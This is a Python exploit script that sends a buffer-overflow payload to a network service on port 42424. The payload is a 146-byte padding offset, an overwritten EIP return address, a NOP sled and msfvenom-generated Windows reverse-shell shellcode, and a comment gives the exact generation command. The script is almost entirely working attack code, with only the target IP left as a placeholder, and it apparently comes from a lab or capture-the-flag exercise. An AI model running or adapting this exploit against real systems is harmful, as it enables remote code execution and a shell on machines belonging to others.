#!/usr/bin/python
#
# msfvenom -p windows/shell_reverse_tcp LHOST=X.X.X.X LPORT=4445 -b "\x00\x0a\x0d" -f python -v opcode >> service-exploit.py
#
import socket

ServiceIP = "X.X.X.X"
ServicePort = 42424

offset = b"A" * 146
EIP = b"\xbf\x16\x04\x08"
nops = b"\x90" * 16
opcode =  b""
opcode += b"\xbd\xba\x29\x1c\x51\xd9\xe8\xd9\x74\x24\xf4"
opcode += b"\x5f\x31\xc9\xb1\x52\x31\x6f\x12\x03\x6f\x12"
opcode += b"\x83\x7d\x2d\xfe\xa4\x7d\xc6\x7c\x46\x7d\x17"
opcode += b"\xe1\xce\x98\x26\x21\xb4\xe9\x19\x91\xbe\xbf"
opcode += b"\x95\x5a\x92\x2b\x2d\x2e\x3b\x5c\x86\x85\x1d"
opcode += b"\x53\x17\xb5\x5e\xf2\x9b\xc4\xb2\xd4\xa2\x06"
opcode += b"\xc7\x15\xe2\x7b\x2a\x47\xbb\xf0\x99\x77\xc8"
opcode += b"\x4d\x22\xfc\x82\x40\x22\xe1\x53\x62\x03\xb4"
opcode += b"\xe8\x3d\x83\x37\x3c\x36\x8a\x2f\x21\x73\x44"
opcode += b"\xc4\x91\x0f\x57\x0c\xe8\xf0\xf4\x71\xc4\x02"
opcode += b"\x04\xb6\xe3\xfc\x73\xce\x17\x80\x83\x15\x65"
opcode += b"\x5e\x01\x8d\xcd\x15\xb1\x69\xef\xfa\x24\xfa"
opcode += b"\xe3\xb7\x23\xa4\xe7\x46\xe7\xdf\x1c\xc2\x06"
opcode += b"\x0f\x95\x90\x2c\x8b\xfd\x43\x4c\x8a\x5b\x25"
opcode += b"\x71\xcc\x03\x9a\xd7\x87\xae\xcf\x65\xca\xa6"
opcode += b"\x3c\x44\xf4\x36\x2b\xdf\x87\x04\xf4\x4b\x0f"
opcode += b"\x25\x7d\x52\xc8\x4a\x54\x22\x46\xb5\x57\x53"
opcode += b"\x4f\x72\x03\x03\xe7\x53\x2c\xc8\xf7\x5c\xf9"
opcode += b"\x5f\xa7\xf2\x52\x20\x17\xb3\x02\xc8\x7d\x3c"
opcode += b"\x7c\xe8\x7e\x96\x15\x83\x85\x71\x10\x0e\xb9"
opcode += b"\xd1\x4c\xac\xc1\xc0\xd1\x39\x27\x88\xf9\x6f"
opcode += b"\xf0\x25\x63\x2a\x8a\xd4\x6c\xe0\xf7\xd7\xe7"
opcode += b"\x07\x08\x99\x0f\x6d\x1a\x4e\xe0\x38\x40\xd9"
opcode += b"\xff\x96\xec\x85\x92\x7c\xec\xc0\x8e\x2a\xbb"
opcode += b"\x85\x61\x23\x29\x38\xdb\x9d\x4f\xc1\xbd\xe6"
opcode += b"\xcb\x1e\x7e\xe8\xd2\xd3\x3a\xce\xc4\x2d\xc2"
opcode += b"\x4a\xb0\xe1\x95\x04\x6e\x44\x4c\xe7\xd8\x1e"
opcode += b"\x23\xa1\x8c\xe7\x0f\x72\xca\xe7\x45\x04\x32"
opcode += b"\x59\x30\x51\x4d\x56\xd4\x55\x36\x8a\x44\x99"
opcode += b"\xed\x0e\x74\xd0\xaf\x27\x1d\xbd\x3a\x7a\x40"
opcode += b"\x3e\x91\xb9\x7d\xbd\x13\x42\x7a\xdd\x56\x47"
opcode += b"\xc6\x59\x8b\x35\x57\x0c\xab\xea\x58\x05"

payload = offset + EIP + nops + opcode + b"\r\n"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ServiceIP, ServicePort))
    s.send(payload)
    print("Sent to %s:%d" %(ServiceIP, ServicePort))
except Exception as error:
    print("Connection Error %s:%d" %(ServiceIP, ServicePort))
    print("Exception is: %s" %(error))
finally:
    s.close()
